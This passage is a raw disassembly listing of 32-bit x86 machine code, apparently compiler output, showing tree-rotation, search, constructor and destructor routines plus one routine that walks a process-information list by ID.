   13142:	push   esi
   13143:	mov    esi,DWORD PTR [eax+0x8]
   13146:	mov    DWORD PTR [edx],esi
   13148:	mov    esi,DWORD PTR [eax+0x8]
   1314b:	cmp    esi,DWORD PTR ds:0x7f8c8
   13151:	je     0x13156
   13153:	mov    DWORD PTR [esi+0x4],edx
   13156:	mov    esi,DWORD PTR [edx+0x4]
   13159:	mov    DWORD PTR [eax+0x4],esi
   1315c:	mov    ecx,DWORD PTR [ecx+0x4]
   1315f:	pop    esi
   13160:	cmp    edx,DWORD PTR [ecx+0x4]
   13163:	jne    0x1316a
   13165:	mov    DWORD PTR [ecx+0x4],eax
   13168:	jmp    0x13179
   1316a:	mov    ecx,DWORD PTR [edx+0x4]
   1316d:	cmp    edx,DWORD PTR [ecx+0x8]
   13170:	jne    0x13177
   13172:	mov    DWORD PTR [ecx+0x8],eax
   13175:	jmp    0x13179
   13177:	mov    DWORD PTR [ecx],eax
   13179:	mov    DWORD PTR [eax+0x8],edx
   1317c:	mov    DWORD PTR [edx+0x4],eax
   1317f:	pop    ebp
   13180:	ret    0x4
   13183:	int3   
   13184:	int3   
   13185:	int3   
   13186:	int3   
   13187:	int3   
   13188:	mov    edi,edi
   1318a:	push   ebp
   1318b:	mov    ebp,esp
   1318d:	mov    eax,DWORD PTR [ecx+0x4]
   13190:	push   esi
   13191:	mov    esi,DWORD PTR [eax+0x4]
   13194:	push   edi
   13195:	mov    edi,eax
   13197:	jmp    0x131b2
   13199:	lea    eax,[esi+0xc]
   1319c:	push   eax
   1319d:	push   DWORD PTR [ebp+0x8]
   131a0:	call   0x19790
   131a5:	test   al,al
   131a7:	je     0x131af
   131a9:	mov    edi,esi
   131ab:	mov    esi,DWORD PTR [esi]
   131ad:	jmp    0x131b2
   131af:	mov    esi,DWORD PTR [esi+0x8]
   131b2:	cmp    esi,DWORD PTR ds:0x7f8c8
   131b8:	jne    0x13199
   131ba:	mov    eax,edi
   131bc:	pop    edi
   131bd:	pop    esi
   131be:	pop    ebp
   131bf:	ret    0x4
   131c2:	int3   
   131c3:	int3   
   131c4:	int3   
   131c5:	int3   
   131c6:	int3   
   131c7:	int3   
   131c8:	mov    edi,edi
   131ca:	push   ebp
   131cb:	mov    ebp,esp
   131cd:	mov    edx,DWORD PTR [ebp+0x8]
   131d0:	mov    eax,DWORD PTR [edx+0x8]
   131d3:	push   esi
   131d4:	mov    esi,DWORD PTR [eax]
   131d6:	mov    DWORD PTR [edx+0x8],esi
   131d9:	mov    esi,DWORD PTR [eax]
   131db:	cmp    esi,DWORD PTR ds:0x7f8cc
   131e1:	je     0x131e6
   131e3:	mov    DWORD PTR [esi+0x4],edx
   131e6:	mov    esi,DWORD PTR [edx+0x4]
   131e9:	mov    DWORD PTR [eax+0x4],esi
   131ec:	mov    ecx,DWORD PTR [ecx+0x4]
   131ef:	pop    esi
   131f0:	cmp    edx,DWORD PTR [ecx+0x4]
   131f3:	jne    0x131fa
   131f5:	mov    DWORD PTR [ecx+0x4],eax
   131f8:	jmp    0x13208
   131fa:	mov    ecx,DWORD PTR [edx+0x4]
   131fd:	cmp    edx,DWORD PTR [ecx]
   131ff:	jne    0x13205
   13201:	mov    DWORD PTR [ecx],eax
   13203:	jmp    0x13208
   13205:	mov    DWORD PTR [ecx+0x8],eax
   13208:	mov    DWORD PTR [eax],edx
   1320a:	mov    DWORD PTR [edx+0x4],eax
   1320d:	pop    ebp
   1320e:	ret    0x4
   13211:	int3   
   13212:	int3   
   13213:	int3   
   13214:	int3   
   13215:	int3   
   13216:	mov    edi,edi
   13218:	push   ebp
   13219:	mov    ebp,esp
   1321b:	mov    edx,DWORD PTR [ebp+0x8]
   1321e:	mov    eax,DWORD PTR [edx]
   13220:	push   esi
   13221:	mov    esi,DWORD PTR [eax+0x8]
   13224:	mov    DWORD PTR [edx],esi
   13226:	mov    esi,DWORD PTR [eax+0x8]
   13229:	cmp    esi,DWORD PTR ds:0x7f8cc
   1322f:	je     0x13234
   13231:	mov    DWORD PTR [esi+0x4],edx
   13234:	mov    esi,DWORD PTR [edx+0x4]
   13237:	mov    DWORD PTR [eax+0x4],esi
   1323a:	mov    ecx,DWORD PTR [ecx+0x4]
   1323d:	pop    esi
   1323e:	cmp    edx,DWORD PTR [ecx+0x4]
   13241:	jne    0x13248
   13243:	mov    DWORD PTR [ecx+0x4],eax
   13246:	jmp    0x13257
   13248:	mov    ecx,DWORD PTR [edx+0x4]
   1324b:	cmp    edx,DWORD PTR [ecx+0x8]
   1324e:	jne    0x13255
   13250:	mov    DWORD PTR [ecx+0x8],eax
   13253:	jmp    0x13257
   13255:	mov    DWORD PTR [ecx],eax
   13257:	mov    DWORD PTR [eax+0x8],edx
   1325a:	mov    DWORD PTR [edx+0x4],eax
   1325d:	pop    ebp
   1325e:	ret    0x4
   13261:	int3   
   13262:	int3   
   13263:	int3   
   13264:	int3   
   13265:	int3   
   13266:	mov    edi,edi
   13268:	push   ebp
   13269:	mov    ebp,esp
   1326b:	mov    eax,DWORD PTR [ecx+0x4]
   1326e:	mov    ecx,DWORD PTR [eax+0x4]
   13271:	mov    edx,DWORD PTR ds:0x7f8cc
   13277:	cmp    ecx,edx
   13279:	je     0x13294
   1327b:	push   esi
   1327c:	mov    esi,DWORD PTR [ebp+0x8]
   1327f:	mov    esi,DWORD PTR [esi]
   13281:	cmp    esi,DWORD PTR [ecx+0xc]
   13284:	jge    0x1328c
   13286:	mov    eax,ecx
   13288:	mov    ecx,DWORD PTR [ecx]
   1328a:	jmp    0x1328f
   1328c:	mov    ecx,DWORD PTR [ecx+0x8]
   1328f:	cmp    ecx,edx
   13291:	jne    0x13281
   13293:	pop    esi
   13294:	pop    ebp
   13295:	ret    0x4
   13298:	int3   
   13299:	int3   
   1329a:	int3   
   1329b:	int3   
   1329c:	int3   
   1329d:	int3   
   1329e:	mov    edi,edi
   132a0:	push   ebp
   132a1:	mov    ebp,esp
   132a3:	mov    eax,DWORD PTR [ecx+0x4]
   132a6:	push   esi
   132a7:	mov    esi,DWORD PTR [eax+0x4]
   132aa:	push   edi
   132ab:	mov    edi,eax
   132ad:	jmp    0x132c8
   132af:	push   DWORD PTR [ebp+0x8]
   132b2:	lea    eax,[esi+0xc]
   132b5:	push   eax
   132b6:	call   0x197c0
   132bb:	test   al,al
   132bd:	je     0x132c4
   132bf:	mov    esi,DWORD PTR [esi+0x8]
   132c2:	jmp    0x132c8
   132c4:	mov    edi,esi
   132c6:	mov    esi,DWORD PTR [esi]
   132c8:	cmp    esi,DWORD PTR ds:0x7f8d4
   132ce:	jne    0x132af
   132d0:	mov    eax,edi
   132d2:	pop    edi
   132d3:	pop    esi
   132d4:	pop    ebp
   132d5:	ret    0x4
   132d8:	int3   
   132d9:	int3   
   132da:	int3   
   132db:	int3   
   132dc:	int3   
   132dd:	int3   
   132de:	mov    edi,edi
   132e0:	push   ebp
   132e1:	mov    ebp,esp
   132e3:	mov    edx,DWORD PTR [ebp+0x8]
   132e6:	mov    eax,DWORD PTR [edx+0x8]
   132e9:	push   esi
   132ea:	mov    esi,DWORD PTR [eax]
   132ec:	mov    DWORD PTR [edx+0x8],esi
   132ef:	mov    esi,DWORD PTR [eax]
   132f1:	cmp    esi,DWORD PTR ds:0x7f8d4
   132f7:	je     0x132fc
   132f9:	mov    DWORD PTR [esi+0x4],edx
   132fc:	mov    esi,DWORD PTR [edx+0x4]
   132ff:	mov    DWORD PTR [eax+0x4],esi
   13302:	mov    ecx,DWORD PTR [ecx+0x4]
   13305:	pop    esi
   13306:	cmp    edx,DWORD PTR [ecx+0x4]
   13309:	jne    0x13310
   1330b:	mov    DWORD PTR [ecx+0x4],eax
   1330e:	jmp    0x1331e
   13310:	mov    ecx,DWORD PTR [edx+0x4]
   13313:	cmp    edx,DWORD PTR [ecx]
   13315:	jne    0x1331b
   13317:	mov    DWORD PTR [ecx],eax
   13319:	jmp    0x1331e
   1331b:	mov    DWORD PTR [ecx+0x8],eax
   1331e:	mov    DWORD PTR [eax],edx
   13320:	mov    DWORD PTR [edx+0x4],eax
   13323:	pop    ebp
   13324:	ret    0x4
   13327:	int3   
   13328:	int3   
   13329:	int3   
   1332a:	int3   
   1332b:	int3   
   1332c:	mov    edi,edi
   1332e:	push   ebp
   1332f:	mov    ebp,esp
   13331:	mov    edx,DWORD PTR [ebp+0x8]
   13334:	mov    eax,DWORD PTR [edx]
   13336:	push   esi
   13337:	mov    esi,DWORD PTR [eax+0x8]
   1333a:	mov    DWORD PTR [edx],esi
   1333c:	mov    esi,DWORD PTR [eax+0x8]
   1333f:	cmp    esi,DWORD PTR ds:0x7f8d4
   13345:	je     0x1334a
   13347:	mov    DWORD PTR [esi+0x4],edx
   1334a:	mov    esi,DWORD PTR [edx+0x4]
   1334d:	mov    DWORD PTR [eax+0x4],esi
   13350:	mov    ecx,DWORD PTR [ecx+0x4]
   13353:	pop    esi
   13354:	cmp    edx,DWORD PTR [ecx+0x4]
   13357:	jne    0x1335e
   13359:	mov    DWORD PTR [ecx+0x4],eax
   1335c:	jmp    0x1336d
   1335e:	mov    ecx,DWORD PTR [edx+0x4]
   13361:	cmp    edx,DWORD PTR [ecx+0x8]
   13364:	jne    0x1336b
   13366:	mov    DWORD PTR [ecx+0x8],eax
   13369:	jmp    0x1336d
   1336b:	mov    DWORD PTR [ecx],eax
   1336d:	mov    DWORD PTR [eax+0x8],edx
   13370:	mov    DWORD PTR [edx+0x4],eax
   13373:	pop    ebp
   13374:	ret    0x4
   13377:	int3   
   13378:	int3   
   13379:	int3   
   1337a:	int3   
   1337b:	int3   
   1337c:	mov    edi,edi
   1337e:	push   esi
   1337f:	mov    esi,ecx
   13381:	mov    ecx,DWORD PTR [esi]
   13383:	cmp    DWORD PTR [ecx+0x1c],0x0
   13387:	jne    0x13396
   13389:	mov    eax,DWORD PTR [ecx+0x4]
   1338c:	cmp    DWORD PTR [eax+0x4],ecx
   1338f:	jne    0x13396
   13391:	mov    eax,DWORD PTR [ecx+0x8]
   13394:	jmp    0x133b3
   13396:	mov    eax,DWORD PTR [ecx]
   13398:	cmp    eax,DWORD PTR ds:0x7f8d4
   1339e:	je     0x133ac
   133a0:	push   eax
   133a1:	call   0x115a0
   133a6:	jmp    0x133b3
   133a8:	mov    DWORD PTR [esi],eax
   133aa:	mov    ecx,eax
   133ac:	mov    eax,DWORD PTR [ecx+0x4]
   133af:	cmp    ecx,DWORD PTR [eax]
   133b1:	je     0x133a8
   133b3:	mov    DWORD PTR [esi],eax
   133b5:	pop    esi
   133b6:	ret    
   133b7:	int3   
   133b8:	int3   
   133b9:	int3   
   133ba:	int3   
   133bb:	int3   
   133bc:	mov    edi,edi
   133be:	push   ebp
   133bf:	mov    ebp,esp
   133c1:	mov    eax,DWORD PTR [ecx+0x4]
   133c4:	mov    ecx,DWORD PTR [eax+0x4]
   133c7:	mov    edx,DWORD PTR ds:0x7f8bc
   133cd:	cmp    ecx,edx
   133cf:	je     0x133ea
   133d1:	push   esi
   133d2:	mov    esi,DWORD PTR [ebp+0x8]
   133d5:	mov    esi,DWORD PTR [esi]
   133d7:	cmp    DWORD PTR [ecx+0xc],esi
   133da:	jae    0x133e1
   133dc:	mov    ecx,DWORD PTR [ecx+0x8]
   133df:	jmp    0x133e5
   133e1:	mov    eax,ecx
   133e3:	mov    ecx,DWORD PTR [ecx]
   133e5:	cmp    ecx,edx
   133e7:	jne    0x133d7
   133e9:	pop    esi
   133ea:	pop    ebp
   133eb:	ret    0x4
   133ee:	int3   
   133ef:	int3   
   133f0:	int3   
   133f1:	int3   
   133f2:	int3   
   133f3:	int3   
   133f4:	mov    edi,edi
   133f6:	push   ebp
   133f7:	mov    ebp,esp
   133f9:	mov    eax,DWORD PTR [ecx+0x4]
   133fc:	mov    ecx,DWORD PTR [eax+0x4]
   133ff:	mov    edx,DWORD PTR ds:0x7f8bc
   13405:	cmp    ecx,edx
   13407:	je     0x13422
   13409:	push   esi
   1340a:	mov    esi,DWORD PTR [ebp+0x8]
   1340d:	mov    esi,DWORD PTR [esi]
   1340f:	cmp    esi,DWORD PTR [ecx+0xc]
   13412:	jae    0x1341a
   13414:	mov    eax,ecx
   13416:	mov    ecx,DWORD PTR [ecx]
   13418:	jmp    0x1341d
   1341a:	mov    ecx,DWORD PTR [ecx+0x8]
   1341d:	cmp    ecx,edx
   1341f:	jne    0x1340f
   13421:	pop    esi
   13422:	pop    ebp
   13423:	ret    0x4
   13426:	int3   
   13427:	int3   
   13428:	int3   
   13429:	int3   
   1342a:	int3   
   1342b:	int3   
   1342c:	mov    edi,edi
   1342e:	push   ebp
   1342f:	mov    ebp,esp
   13431:	push   esi
   13432:	push   edi
   13433:	mov    edi,DWORD PTR [ebp+0x8]
   13436:	push   edi
   13437:	mov    esi,ecx
   13439:	call   0x12aec
   1343e:	add    edi,0x8
   13441:	push   edi
   13442:	lea    ecx,[esi+0x8]
   13445:	call   0x12aec
   1344a:	pop    edi
   1344b:	mov    eax,esi
   1344d:	pop    esi
   1344e:	pop    ebp
   1344f:	ret    0x4
   13452:	int3   
   13453:	int3   
   13454:	int3   
   13455:	int3   
   13456:	int3   
   13457:	int3   
   13458:	mov    edi,edi
   1345a:	push   ebp
   1345b:	mov    ebp,esp
   1345d:	push   esi
   1345e:	push   edi
   1345f:	mov    edi,DWORD PTR [ebp+0x8]
   13462:	push   edi
   13463:	mov    esi,ecx
   13465:	call   0x1297a
   1346a:	add    edi,0x8
   1346d:	push   edi
   1346e:	lea    ecx,[esi+0x8]
   13471:	call   0x1297a
   13476:	pop    edi
   13477:	mov    eax,esi
   13479:	pop    esi
   1347a:	pop    ebp
   1347b:	ret    0x4
   1347e:	int3   
   1347f:	int3   
   13480:	int3   
   13481:	int3   
   13482:	int3   
   13483:	int3   
   13484:	mov    edi,edi
   13486:	push   ebp
   13487:	mov    ebp,esp
   13489:	mov    ecx,DWORD PTR [ebp+0x8]
   1348c:	push   0x0
   1348e:	call   0x11648
   13493:	pop    ebp
   13494:	ret    0x4
   13497:	int3   
   13498:	int3   
   13499:	int3   
   1349a:	int3   
   1349b:	int3   
   1349c:	mov    edi,edi
   1349e:	push   ebp
   1349f:	mov    ebp,esp
   134a1:	push   esi
   134a2:	push   edi
   134a3:	mov    edi,DWORD PTR [ebp+0x8]
   134a6:	push   edi
   134a7:	mov    esi,ecx
   134a9:	call   0x12c14
   134ae:	mov    eax,DWORD PTR [edi+0x50]
   134b1:	mov    DWORD PTR [esi+0x50],eax
   134b4:	pop    edi
   134b5:	mov    eax,esi
   134b7:	pop    esi
   134b8:	pop    ebp
   134b9:	ret    0x4
   134bc:	int3   
   134bd:	int3   
   134be:	int3   
   134bf:	int3   
   134c0:	int3   
   134c1:	int3   
   134c2:	mov    edi,edi
   134c4:	push   ebp
   134c5:	mov    ebp,esp
   134c7:	push   esi
   134c8:	push   edi
   134c9:	mov    edi,DWORD PTR [ebp+0x8]
   134cc:	push   edi
   134cd:	mov    esi,ecx
   134cf:	call   0x1297a
   134d4:	add    edi,0x8
   134d7:	push   edi
   134d8:	lea    ecx,[esi+0x8]
   134db:	call   0x1349c
   134e0:	pop    edi
   134e1:	mov    eax,esi
   134e3:	pop    esi
   134e4:	pop    ebp
   134e5:	ret    0x4
   134e8:	int3   
   134e9:	int3   
   134ea:	int3   
   134eb:	int3   
   134ec:	int3   
   134ed:	int3   
   134ee:	mov    edi,edi
   134f0:	push   ebp
   134f1:	mov    ebp,esp
   134f3:	push   esi
   134f4:	mov    esi,ecx
   134f6:	call   0x12ab0
   134fb:	test   BYTE PTR [ebp+0x8],0x1
   134ff:	je     0x13508
   13501:	push   esi
   13502:	call   0x1d9f8
   13507:	pop    ecx
   13508:	mov    eax,esi
   1350a:	pop    esi
   1350b:	pop    ebp
   1350c:	ret    0x4
   1350f:	int3   
   13510:	int3   
   13511:	int3   
   13512:	int3   
   13513:	int3   
   13514:	mov    edi,edi
   13516:	push   ebp
   13517:	mov    ebp,esp
   13519:	push   esi
   1351a:	push   edi
   1351b:	mov    edi,DWORD PTR [ebp+0x8]
   1351e:	push   edi
   1351f:	mov    esi,ecx
   13521:	call   0x1297a
   13526:	add    edi,0x8
   13529:	push   edi
   1352a:	lea    ecx,[esi+0x8]
   1352d:	call   0x12c14
   13532:	pop    edi
   13533:	mov    eax,esi
   13535:	pop    esi
   13536:	pop    ebp
   13537:	ret    0x4
   1353a:	int3   
   1353b:	int3   
   1353c:	int3   
   1353d:	int3   
   1353e:	int3   
   1353f:	int3   
   13540:	mov    edi,edi
   13542:	push   ebp
   13543:	mov    ebp,esp
   13545:	mov    eax,DWORD PTR [ebp+0x8]
   13548:	push   esi
   13549:	mov    esi,ecx
   1354b:	mov    ecx,DWORD PTR [eax]
   1354d:	add    eax,0x4
   13550:	mov    DWORD PTR [esi],ecx
   13552:	push   eax
   13553:	lea    ecx,[esi+0x4]
   13556:	call   0x11edc
   1355b:	mov    eax,esi
   1355d:	pop    esi
   1355e:	pop    ebp
   1355f:	ret    0x4
   13562:	int3   
   13563:	int3   
   13564:	int3   
   13565:	int3   
   13566:	int3   
   13567:	int3   
   13568:	mov    edi,edi
   1356a:	push   ebp
   1356b:	mov    ebp,esp
   1356d:	push   esi
   1356e:	mov    esi,ecx
   13570:	mov    ecx,DWORD PTR [esi+0x4]
   13573:	test   ecx,ecx
   13575:	je     0x1357c
   13577:	call   0x10a86
   1357c:	test   BYTE PTR [ebp+0x8],0x1
   13580:	je     0x13589
   13582:	push   esi
   13583:	call   0x1d9f8
   13588:	pop    ecx
   13589:	mov    eax,esi
   1358b:	pop    esi
   1358c:	pop    ebp
   1358d:	ret    0x4
   13590:	int3   
   13591:	int3   
   13592:	int3   
   13593:	int3   
   13594:	int3   
   13595:	int3   
   13596:	mov    edi,edi
   13598:	push   ebp
   13599:	mov    ebp,esp
   1359b:	push   esi
   1359c:	push   DWORD PTR [ebp+0x8]
   1359f:	mov    esi,ecx
   135a1:	call   0x1297a
   135a6:	push   DWORD PTR [ebp+0xc]
   135a9:	lea    ecx,[esi+0x8]
   135ac:	call   0x1349c
   135b1:	mov    eax,esi
   135b3:	pop    esi
   135b4:	pop    ebp
   135b5:	ret    0x8
   135b8:	int3   
   135b9:	int3   
   135ba:	int3   
   135bb:	int3   
   135bc:	int3   
   135bd:	int3   
   135be:	mov    edi,edi
   135c0:	push   ebp
   135c1:	mov    ebp,esp
   135c3:	push   esi
   135c4:	push   DWORD PTR [ebp+0x8]
   135c7:	mov    esi,ecx
   135c9:	call   0x12aec
   135ce:	push   DWORD PTR [ebp+0xc]
   135d1:	lea    ecx,[esi+0x8]
   135d4:	call   0x12aec
   135d9:	mov    eax,esi
   135db:	pop    esi
   135dc:	pop    ebp
   135dd:	ret    0x8
   135e0:	int3   
   135e1:	int3   
   135e2:	int3   
   135e3:	int3   
   135e4:	int3   
   135e5:	int3   
   135e6:	mov    edi,edi
   135e8:	push   ebp
   135e9:	mov    ebp,esp
   135eb:	push   esi
   135ec:	push   DWORD PTR [ebp+0x8]
   135ef:	mov    esi,ecx
   135f1:	call   0x1297a
   135f6:	push   DWORD PTR [ebp+0xc]
   135f9:	lea    ecx,[esi+0x8]
   135fc:	call   0x1297a
   13601:	mov    eax,esi
   13603:	pop    esi
   13604:	pop    ebp
   13605:	ret    0x8
   13608:	int3   
   13609:	int3   
   1360a:	int3   
   1360b:	int3   
   1360c:	int3   
   1360d:	int3   
   1360e:	mov    edi,edi
   13610:	push   ebp
   13611:	mov    ebp,esp
   13613:	push   edi
   13614:	mov    edi,DWORD PTR [ebp+0xc]
   13617:	cmp    DWORD PTR [ebp+0x8],edi
   1361a:	je     0x13630
   1361c:	push   esi
   1361d:	mov    esi,DWORD PTR [ebp+0x10]
   13620:	inc    DWORD PTR [esi]
   13622:	lea    ecx,[ebp+0x8]
   13625:	call   0x112b6
   1362a:	cmp    DWORD PTR [ebp+0x8],edi
   1362d:	jne    0x13620
   1362f:	pop    esi
   13630:	pop    edi
   13631:	pop    ebp
   13632:	ret    
   13633:	int3   
   13634:	int3   
   13635:	int3   
   13636:	int3   
   13637:	int3   
   13638:	mov    edi,edi
   1363a:	push   ebp
   1363b:	mov    ebp,esp
   1363d:	push   edi
   1363e:	mov    edi,DWORD PTR [ebp+0xc]
   13641:	cmp    DWORD PTR [ebp+0x8],edi
   13644:	je     0x1365a
   13646:	push   esi
   13647:	mov    esi,DWORD PTR [ebp+0x10]
   1364a:	inc    DWORD PTR [esi]
   1364c:	lea    ecx,[ebp+0x8]
   1364f:	call   0x11534
   13654:	cmp    DWORD PTR [ebp+0x8],edi
   13657:	jne    0x1364a
   13659:	pop    esi
   1365a:	pop    edi
   1365b:	pop    ebp
   1365c:	ret    
   1365d:	int3   
   1365e:	int3   
   1365f:	int3   
   13660:	int3   
   13661:	int3   
   13662:	mov    edi,edi
   13664:	push   ebp
   13665:	mov    ebp,esp
   13667:	push   edi
   13668:	mov    edi,DWORD PTR [ebp+0xc]
   1366b:	cmp    DWORD PTR [ebp+0x8],edi
   1366e:	je     0x13684
   13670:	push   esi
   13671:	mov    esi,DWORD PTR [ebp+0x10]
   13674:	inc    DWORD PTR [esi]
   13676:	lea    ecx,[ebp+0x8]
   13679:	call   0x1156a
   1367e:	cmp    DWORD PTR [ebp+0x8],edi
   13681:	jne    0x13674
   13683:	pop    esi
   13684:	pop    edi
   13685:	pop    ebp
   13686:	ret    
   13687:	int3   
   13688:	int3   
   13689:	int3   
   1368a:	int3   
   1368b:	int3   
   1368c:	mov    edi,edi
   1368e:	push   ebp
   1368f:	mov    ebp,esp
   13691:	push   edi
   13692:	mov    edi,DWORD PTR [ebp+0xc]
   13695:	cmp    DWORD PTR [ebp+0x8],edi
   13698:	je     0x136ae
   1369a:	push   esi
   1369b:	mov    esi,DWORD PTR [ebp+0x10]
   1369e:	inc    DWORD PTR [esi]
   136a0:	lea    ecx,[ebp+0x8]
   136a3:	call   0x12ec0
   136a8:	cmp    DWORD PTR [ebp+0x8],edi
   136ab:	jne    0x1369e
   136ad:	pop    esi
   136ae:	pop    edi
   136af:	pop    ebp
   136b0:	ret    
   136b1:	int3   
   136b2:	int3   
   136b3:	int3   
   136b4:	int3   
   136b5:	int3   
   136b6:	mov    edi,edi
   136b8:	push   ebx
   136b9:	push   esi
   136ba:	push   edi
   136bb:	or     ebx,0xffffffff
   136be:	push   ebx
   136bf:	mov    edi,0x1ded0
   136c4:	push   edi
   136c5:	mov    esi,ecx
   136c7:	call   0x1109a
   136cc:	push   ebx
   136cd:	push   edi
   136ce:	lea    ecx,[esi+0x8]
   136d1:	call   0x1109a
   136d6:	push   ebx
   136d7:	push   edi
   136d8:	lea    ecx,[esi+0x14]
   136db:	call   0x1109a
   136e0:	push   ebx
   136e1:	push   edi
   136e2:	lea    ecx,[esi+0x1c]
   136e5:	call   0x1109a
   136ea:	push   ebx
   136eb:	push   edi
   136ec:	lea    ecx,[esi+0x24]
   136ef:	call   0x1109a
   136f4:	push   ebx
   136f5:	push   edi
   136f6:	lea    ecx,[esi+0x48]
   136f9:	call   0x1109a
   136fe:	xor    eax,eax
   13700:	mov    DWORD PTR [esi+0x10],eax
   13703:	mov    DWORD PTR [esi+0x30],eax
   13706:	mov    DWORD PTR [esi+0x2c],eax
   13709:	mov    DWORD PTR [esi+0x40],eax
   1370c:	mov    DWORD PTR [esi+0x44],eax
   1370f:	pop    edi
   13710:	mov    eax,esi
   13712:	pop    esi
   13713:	pop    ebx
   13714:	ret    
   13715:	int3   
   13716:	int3   
   13717:	int3   
   13718:	int3   
   13719:	int3   
   1371a:	mov    edi,edi
   1371c:	push   ebp
   1371d:	mov    ebp,esp
   1371f:	push   esi
   13720:	push   DWORD PTR [ebp+0x8]
   13723:	mov    esi,ecx
   13725:	call   0x1297a
   1372a:	push   DWORD PTR [ebp+0xc]
   1372d:	lea    ecx,[esi+0x8]
   13730:	call   0x1297a
   13735:	mov    eax,DWORD PTR [ebp+0x10]
   13738:	push   0xffffffff
   1373a:	push   0x1ded0
   1373f:	lea    ecx,[esi+0x14]
   13742:	mov    DWORD PTR [esi+0x10],eax
   13745:	call   0x1109a
   1374a:	push   DWORD PTR [ebp+0x14]
   1374d:	lea    ecx,[esi+0x1c]
   13750:	call   0x1297a
   13755:	push   DWORD PTR [ebp+0x18]
   13758:	lea    ecx,[esi+0x24]
   1375b:	call   0x1297a
   13760:	mov    eax,DWORD PTR [ebp+0x20]
   13763:	push   DWORD PTR [ebp+0x1c]
   13766:	mov    DWORD PTR [esi+0x2c],eax
   13769:	mov    eax,DWORD PTR [ebp+0x24]
   1376c:	lea    ecx,[esi+0x48]
   1376f:	mov    DWORD PTR [esi+0x30],eax
   13772:	call   0x1297a
   13777:	and    DWORD PTR [esi+0x40],0x0
   1377b:	and    DWORD PTR [esi+0x44],0x0
   1377f:	mov    eax,DWORD PTR [ebp+0x28]
   13782:	mov    ecx,DWORD PTR [eax]
   13784:	mov    DWORD PTR [esi+0x38],ecx
   13787:	mov    eax,DWORD PTR [eax+0x4]
   1378a:	mov    DWORD PTR [esi+0x3c],eax
   1378d:	mov    eax,esi
   1378f:	pop    esi
   13790:	pop    ebp
   13791:	ret    0x24
   13794:	int3   
   13795:	int3   
   13796:	int3   
   13797:	int3   
   13798:	int3   
   13799:	int3   
   1379a:	mov    edi,edi
   1379c:	push   ebp
   1379d:	mov    ebp,esp
   1379f:	push   esi
   137a0:	push   0xc
   137a2:	mov    esi,ecx
   137a4:	call   0x10a52
   137a9:	pop    ecx
   137aa:	test   eax,eax
   137ac:	je     0x137bd
   137ae:	push   DWORD PTR [ebp+0xc]
   137b1:	mov    ecx,eax
   137b3:	push   DWORD PTR [ebp+0x8]
   137b6:	call   0x11f2a
   137bb:	jmp    0x137bf
   137bd:	xor    eax,eax
   137bf:	mov    DWORD PTR [esi],eax
   137c1:	mov    eax,esi
   137c3:	pop    esi
   137c4:	pop    ebp
   137c5:	ret    0x8
   137c8:	int3   
   137c9:	int3   
   137ca:	int3   
   137cb:	int3   
   137cc:	int3   
   137cd:	int3   
   137ce:	mov    edi,edi
   137d0:	push   ebp
   137d1:	mov    ebp,esp
   137d3:	sub    esp,0x18
   137d6:	lea    eax,[ebp-0x18]
   137d9:	push   eax
   137da:	push   DWORD PTR [ebp+0x8]
   137dd:	call   0x10e72
   137e2:	test   al,al
   137e4:	je     0x13853
   137e6:	lea    eax,[ebp-0x4]
   137e9:	push   eax
   137ea:	push   DWORD PTR [ebp+0xc]
   137ed:	call   0x11c80
   137f2:	call   eax
   137f4:	test   eax,eax
   137f6:	jl     0x13853
   137f8:	push   esi
   137f9:	push   0x5
   137fb:	call   0x128d0
   13800:	mov    esi,eax
   13802:	test   esi,esi
   13804:	je     0x13852
   13806:	mov    edx,DWORD PTR [ebp+0x10]
   13809:	cmp    DWORD PTR [esi+0x44],edx
   1380c:	je     0x1381b
   1380e:	mov    ecx,DWORD PTR [eax]
   13810:	test   ecx,ecx
   13812:	je     0x1383f
   13814:	add    eax,ecx
   13816:	cmp    DWORD PTR [eax+0x44],edx
   13819:	jne    0x1380e
   1381b:	cmp    DWORD PTR [eax+0x4],0x0
   1381f:	je     0x1383f
   13821:	mov    ecx,DWORD PTR [eax+0xd8]
   13827:	mov    eax,DWORD PTR [eax+0xdc]
   1382d:	mov    DWORD PTR [ebp-0x14],eax
   13830:	lea    eax,[ebp-0x18]
   13833:	push   eax
   13834:	push   DWORD PTR [ebp+0x8]
   13837:	mov    DWORD PTR [ebp-0x18],ecx
   1383a:	call   0x10ec0
   1383f:	call   0x11c56
   13844:	mov    ecx,DWORD PTR [ebp-0x4]
   13847:	call   eax
   13849:	push   0x0
   1384b:	push   esi
   1384c:	call   DWORD PTR ds:0x1ee1c
   13852:	pop    esi
   13853:	leave  
   13854:	ret    0x10
   13857:	int3   
   13858:	int3   
   13859:	int3   
   1385a:	int3   
   1385b:	int3   
   1385c:	mov    edi,edi
   1385e:	push   esi
   1385f:	mov    esi,ecx
   13861:	mov    ecx,DWORD PTR [esi]
   13863:	mov    eax,DWORD PTR [ecx+0x8]
   13866:	cmp    eax,DWORD PTR ds:0x7f8c4
   1386c:	je     0x1387a
   1386e:	push   eax
   1386f:	call   0x12c9a
   13874:	jmp    0x13889
   13876:	mov    DWORD PTR [esi],eax
   13878:	mov    ecx,eax
   1387a:	mov    eax,DWORD PTR [ecx+0x4]
   1387d:	cmp    ecx,DWORD PTR [eax+0x8]
   13880:	je     0x13876
   13882:	mov    ecx,DWORD PTR [esi]
   13884:	cmp    DWORD PTR [ecx+0x8],eax
   13887:	je     0x1388b
   13889:	mov    DWORD PTR [esi],eax
   1388b:	pop    esi
   1388c:	ret    
   1388d:	int3   
   1388e:	int3   
   1388f:	int3   
   13890:	int3   
   13891:	int3   
   13892:	mov    edi,edi
   13894:	push   ebp
   13895:	mov    ebp,esp
   13897:	push   esi
   13898:	push   DWORD PTR [ebp+0x8]
   1389b:	mov    esi,ecx
   1389d:	call   0x1297a
   138a2:	push   DWORD PTR [ebp+0xc]
   138a5:	lea    ecx,[esi+0x8]
   138a8:	call   0x12c14
   138ad:	mov    eax,esi
   138af:	pop    esi
   138b0:	pop    ebp
   138b1:	ret    0x8
   138b4:	int3   
   138b5:	int3   
   138b6:	int3   
   138b7:	int3   
   138b8:	int3   
   138b9:	int3   
   138ba:	mov    edi,edi
   138bc:	push   ebp
   138bd:	mov    ebp,esp
   138bf:	push   ebx
   138c0:	push   esi
   138c1:	push   edi
   138c2:	mov    edi,DWORD PTR [ebp+0x8]
   138c5:	mov    ebx,ecx
   138c7:	mov    esi,edi
   138c9:	cmp    edi,DWORD PTR ds:0x7f8b8
   138cf:	je     0x138ee
   138d1:	push   DWORD PTR [esi+0x8]
   138d4:	mov    ecx,ebx
   138d6:	call   0x138ba
